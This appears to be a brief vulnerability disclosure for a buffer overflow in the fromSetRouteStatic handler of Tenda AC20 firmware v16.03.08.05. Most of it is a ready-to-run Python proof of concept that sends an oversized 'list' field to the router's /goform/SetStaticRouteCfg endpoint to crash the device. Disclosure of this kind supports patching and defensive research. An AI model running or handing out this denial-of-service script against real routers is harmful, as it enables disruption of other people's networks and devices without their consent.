A buffer overflow vulnerability in Tenda AC20 v16.03.08.05 occurs because the fromSetRouteStatic function does not check the length of input data, which can be exploited by an attacker to launch a denial of service attack.

<img width="415" height="160" alt="image" src="https://github.com/user-attachments/assets/a7ad44f9-8f6a-43bf-98ff-e19129fc78cd" />



POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetStaticRouteCfg"

cookie = {"Cookie":"password=12345"}
data = {"list": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
